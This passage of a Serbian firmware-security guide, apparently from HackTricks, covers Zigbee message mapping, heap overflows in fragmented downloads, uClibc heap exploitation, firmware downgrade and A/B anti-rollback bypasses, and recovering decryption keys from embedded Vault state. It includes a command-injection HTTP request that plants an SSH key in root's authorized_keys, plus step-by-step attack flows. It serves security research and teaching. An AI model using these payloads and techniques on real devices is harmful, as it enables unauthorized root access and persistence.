Za ugrađene ciljne uređaje bez kompletnog debugger-a, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se sa njim udaljeno:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee / radio-co-processor poruka

Na IoT hubovima RF stek je često podeljen između **radio MCU-a** i Linux korisničkog procesa. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF okvir** u vazduhu
2. **parser na strani kontrolera** na radio MCU-u
3. **tekstualni ili TLV protokol preko serijske veze/UART-a** prosleđen Linuxu (na primer `/dev/tty*`)
4. **dispečer aplikacije** u glavnom demonu
5. **rukovalac specifičan za protokol / mašina stanja**

Ova arhitektura daje dve mete za reverse engineering umesto jedne. Ako kontroler pretvara binarne radio-okvire u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i tabele dispečera
- Koje poruke mogu da stignu iz **mreže**, a koje od samog kontrolera
- Tačna **polja za razlikovanje specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji rukovaoci su dostupni samo tokom faza **commissioning**, otkrivanja ili preuzimanja firmvera/modela

Konkretno za Zigbee, snimite saobraćaj uparivanja i proverite da li se meta i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanjem commissioning saobraćaja možda može da se otkrije **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa proverite da li ih testirani uređaj zaista zahteva.

### Rukovaoci protokolima specifičnim za proizvođača i dostupnost ograničena FSM-om

Komande Zigbee/ZCL specifične za proizvođača često su bolja meta od standardizovanih klastera, jer vode do **prilagođenog koda za parsiranje** i internih **FSM-ova** sa manje proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Obrnuto analizirajte dispečer komandi dok ne pronađete **rukovalac namenjen samo proizvođaču**.
- Rekonstruišite tabele **FSM stanja**, **događaja**, **provere**, **akcije** i **sledećeg stanja**.
- Identifikujte **prelazna stanja** koja automatski nastavljaju dalje i grane za ponovni pokušaj/grešku koje na kraju resetuju ili oslobađaju memoriju koju kontroliše napadač.
- Utvrdite koje su legitimne razmene protokola potrebne da bi se demon doveo u ranjivo stanje, umesto da pretpostavite da je ranjivi rukovalac uvek dostupan.

Kod protokola osetljivih na vreme, reprodukcija paketa iz Python okvira može biti prespora. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) pomoću steka za uređaje proizvođačkog nivoa, kako bi se omogućilo korišćenje odgovarajućih **krajnjih tačaka**, **atributa** i vremena za commissioning.

### Klasa grešaka pri fragmentisanom preuzimanju u ugrađenim demonima

Česta klasa grešaka u firmveru javlja se pri **fragmentisanom preuzimanju blob/model/konfiguracije**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) upisuje `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo **lokalna polja paketa** kojima upravlja napadač, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **prvobitno alociranu veličinu**.

Napadač tako može da pošalje:

- Prvi važeći fragment sa **malom** deklarisanom ukupnom veličinom da bi izazvao malu alokaciju na hipu.
- Kasniji fragment sa **očekivanim pomakom**, ali većim `chunk_len`.
- Lažiranu lokalnu veličinu paketa koja zadovoljava nove provere, a ipak izaziva prekoračenje prvobitno alociranog bafera.

Kada je ranjiva putanja iza commissioning logike, eksploatacija mora da uključi dovoljno **emulacije uređaja** da bi se meta dovela u očekivano stanje za preuzimanje modela ili bloba pre slanja neispravnih fragmenata.

### Okidači za `free()` zasnovani na protokolu

U ugrađenim demonima najlakši način da se izazove eksploatacija metapodataka hipa često nije „čekanje na čišćenje“, već **izazivanje sopstvenog rukovanja greškama u protokolu**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente da biste FSM prebacili u stanja **ponovnog pokušaja** ili **greške**.
- Pređite prag broja pokušaja da bi demon **resetovao kontekst** i oslobodio oštećeni bafer.
- Iskoristite ovaj predvidljivi `free()` da biste pokrenuli primitive na strani alokatora pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv alokatora nalik na **musl/uClibc/dlmalloc** u ugrađenom Linuxu, gde oštećivanje metapodataka blokova može da pretvori unlink/unbin logiku u primitivu za upis. Stabilan obrazac je da se ošteti **polje veličine** i preusmeri obilazak alokatora na **lažne blokove smeštene u baferu koji je prekoračen**, umesto da se odmah pregaze pokazivači stvarnih lista blokova i sruši proces.

## Eksploatacija binarnih datoteka i dokaz izvodljivosti

Izrada PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture mete i programiranje u jezicima nižeg nivoa. Zaštite tokom izvršavanja binarnih datoteka retke su u ugrađenim sistemima, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).

### Napomene o eksploataciji uClibc fastbin-a (ugrađeni Linux)

- **Fastbin-ovi + konsolidacija:** uClibc koristi fastbin-ove slične onima u glibc-u. Kasnija velika alokacija može da pokrene `__malloc_consolidate()`, pa svaki lažni blok mora da prođe provere (razumna veličina, `fd = 0` i okolni blokovi prepoznati kao „zauzeti“).<sup>[[6]](#references)</sup>
- **Binarne datoteke koje nisu PIE pod ASLR-om:** ako je ASLR omogućen, ali glavna binarna datoteka **nije PIE**, adrese unutar binarne datoteke u `.data/.bss` su stabilne. Možete ciljati oblast koja već liči na važeće zaglavlje bloka hipa i tako smestiti fastbin alokaciju u **tabelu pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u sadržaju može da zaustavi parsiranje, a da za sobom ostavi bajtove pod kontrolom napadača za pivot steka/ROP lanac.
- **Shellcode preko `/proc/self/mem`:** ROP lanac koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da smesti izvršni shellcode u poznato mapiranje i skoči na njega.

## Pripremljeni operativni sistemi za analizu firmvera

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) nude unapred konfigurisana okruženja za testiranje bezbednosti firmvera, opremljena potrebnim alatima.

## Pripremljeni OS-ovi za analizu firmvera

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena bezbednosnoj proceni i testiranju penetracije IoT uređaja. Štedi mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti ugrađenih uređaja, zasnovan na Ubuntu 18.04, sa unapred instaliranim alatima za testiranje bezbednosti firmvera.

## Napadi vraćanjem firmvera na stariju verziju i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač implementira proveru kriptografskog potpisa za slike firmvera, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Ako boot- ili recovery-loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se upisuje, napadač može legitimno da instalira **stariji, ranjivi firmver sa važećim potpisom** i tako ponovo uvede ranjivosti za koje su već objavljene zakrpe.<sup>[[4]](#references)</sup>

Uobičajeni tok napada:

1. **Nabavite stariju potpisanu sliku**
   * Preuzmite je sa javnog portala za preuzimanje, CDN-a ili sajta podrške proizvođača.
   * Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Pronađite je u repozitorijumima trećih strana, kao što su VirusTotal, internet arhive, forumi itd.
2. **Otpremite sliku na uređaj ili je poslužite uređaju** preko dostupnog kanala za ažuriranje:
   * Veb-interfejs, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi potrošački IoT uređaji izlažu *neautentifikovane* HTTP(S) krajnje tačke koje prihvataju Base64-kodirane blobove firmvera, dekodiraju ih na strani servera i pokreću recovery/ažuriranje.
3. Nakon vraćanja na stariju verziju, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command-injection koji je dodat kasnije).
4. Po želji ponovo upišite najnoviju sliku ili onemogućite ažuriranja da biste izbegli otkrivanje nakon sticanja perzistencije.

### Primer: Command Injection nakon vraćanja na stariju verziju

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom (na stariju verziju vraćenom) firmware-u, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde — omogućavanje root pristupa pomoću SSH ključa). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali zbog izostanka zaštite od vraćanja na stariju verziju, ispravka je beskorisna.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači pakuju kompletne firmware slike u prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX fajlovima, na putanjama poput `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom uređaju.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje anti-rollback zaštite samo u updateru kod dizajna sa A/B slotovima

Neki vendori zaista implementiraju **ratchet** za zaštitu od downgrade-a, ali samo unutar logike *updatera* (na primer UDS rutina preko CAN-a, recovery komanda ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC slike i veruje tabeli particija ili metapodacima slota, zaštita od rollback-a i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmvera sadrže i deskriptor verzije i **security ratchet** / monotonički brojač.
- Updater upoređuje ratchet slike sa vrednošću sačuvanom u trajnoj memoriji i odbacuje starije potpisane slike.
- **Bootloader** ne parsira taj ratchet i pre pokretanja izabranog slota proverava samo zaglavlje, CRC i potpis.
- Aktivacija slota čuva se odvojeno, u tabeli particija ili brojaču generacije za svaki slot, i **nije kriptografski vezana** za tačan digest firmvera koji je validiran.

Time se u sistemima sa dva slota dobija primitiva **validiraj jednu sliku / pokreni drugu**. Ako napadač može da navede updater da označi slot B kao sledeći cilj pokretanja koristeći aktuelnu potpisanu sliku, a zatim da pre ponovnog pokretanja prepiše slot B, bootloader ipak može da pokrene downgraded sliku jer veruje samo već potvrđenim metapodacima slota.

Uobičajeni obrazac zloupotrebe:

1. Otpremi **aktuelni potpisani** firmver u pasivni slot i pokreni uobičajenu rutinu za validaciju/prebacivanje, kako bi raspored označio taj slot kao sledeći aktivni.
2. **Još nemoj da pokrećeš uređaj ponovo.** U istoj sesiji ponovo pokreni rutinu za pripremu/brisanje slota.
3. Iskoristi zastarelo stanje pokretanja ili zastarelu logiku izbora slota, da bi updater obrisao **isti fizički slot** koji je upravo promovisan.
4. Upiši **stariji, ali i dalje potpisani** firmver в taj slot.
5. Preskoči rutinu za validaciju koja sprovodi ratchet i direktno ponovo pokreni uređaj.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i pokreće staru sliku.

Na šta obratiti pažnju pri reverzovanju implementacija A/B ažuriranja:

- Izbor slota izveden iz **zastavica pri pokretanju** koje se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina u stilu `prepare_passive_slot()` koja briše slot na osnovu zastarelog stanja umesto **trenutnog potvrđenog rasporeda**.
- Funkcija u stilu `part_write_layout()` koja samo uvećava **brojač generacije** / aktivnu zastavicu i ne čuva hash validirane slike.
- Provere ratchet-a implementirane u userspace-u ili kodu updatera, ali **ne** u ROM-u / bootloaderu / fazama secure boot-a.
- Rutine za brisanje ili recovery koje ostavljaju slot označenim kao pokretljivim čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/autentikacija *update endpointa* adekvatno zaštićena (TLS + autentikacija)?
* Da li uređaj pre flešovanja upoređuje **brojeve verzija** ili **monotonički brojač za zaštitu od rollback-a**?
* Da li se slika verifikuje unutar lanca secure boot-a (npr. potpise proverava ROM kod)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slota **vezani za digest/verziju validiranog firmvera**, ili slot može da se izmeni nakon promocije?
* Nakon uspešnog prebacivanja slota, da li je uređaj primoran da se ponovo pokrene ili su kasnije rutine za ažuriranje/brisanje i dalje dostupne u istoj sesiji?
* Da li kod userlanda obavlja dodatne provere ispravnosti (npr. dozvoljena mapa particija, broj modela)?
* Da li se u *delimičnim* ili *rezervnim* tokovima ažuriranja ponovo koristi ista logika validacije?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranjivi firmver za vežbu

Za vežbu otkrivanja ranjivosti u firmveru, za početak koristite sledeće projekte ranjivog firmvera.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Projekat Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Pronalaženje ključeva za dešifrovanje firmvera iz ugrađenog stanja KMS/Vault-a

Kada slika ažuriranja kombinuje male metapodatke u otvorenom tekstu sa velikim blobom visoke entropije, pre brute-force pokušaja prvo analizirajte kontejner:<sup>[[1]](#references)</sup>

- Izbacite zaglavlja, offsete i granice redova pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: narednih 8 bajtova je salt, a preostali bajtovi su šifrat.
- Base64 polje koje se dekodira tačno u `256` bajtova snažan je nagoveštaj da gledate RSA-2048 šifrat koji obavija nasumičnu lozinku firmvera ili ključ sesije.
- Odvojeni PGP materijal u istoj datoteci često služi samo za proveru autentičnosti; nemojte pretpostaviti da se njime obezbeđuje poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, reverzujte **operativni put dešifrovanja** umesto da samo tražite privatne ključeve:

- Dekompajlirajte updater / upravljački binarni fajl i pratite ko čita šifrovani blob, koji pomoćni program/API ga dešifruje i koji logički naziv ključa se traži.
- Pretražite izdvojeni root filesystem u potrazi za KMS stanjem (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit fajlovima i init skriptama.
- Tretirajte komande `vault operator unseal ...` u otvorenom tekstu, recovery ključeve, bootstrap tokene ili lokalne KMS skripte za automatsko dešifrovanje kao ekvivalent materijalu privatnog ključa.

Ako uređaj sadrži originalni Vault binarni fajl i backend za skladištenje, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati interne mehanizme Vault-a:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve izvozivim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ sa tačnim parom padding/hash koji koristi KMS. Neuspešan PKCS#1 v1.5 decrypt i neuspešan podrazumevani OAEP decrypt **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok su uobičajene biblioteke podrazumevano podešene na SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte OpenSSL KDF dobavljača (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre pokušaja AES-CBC dekripcije.

Time se problem „šifrovanog firmware-a” svodi na opštiji zadatak: **oporavite operativne ključeve na strani uređaja, a zatim offline reprodukujte tačne parametre za unwrap + KDF**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Probijanje firmware-a uz Claude: veštine seniora, autonomija juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT hacking: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sad me vidiš: sad si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko priključka za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka treperi: iskorišćavanje Philips Hue Bridge-a putem over-the-air napada](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 1. deo: raspakivanje](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacija Linux kernela - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, 2. deo: otklanjanje grešaka i ispravljanje](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS lozinke: slaba XOR enkripcija omogućava oporavak iz SPI fleša (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - alati za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
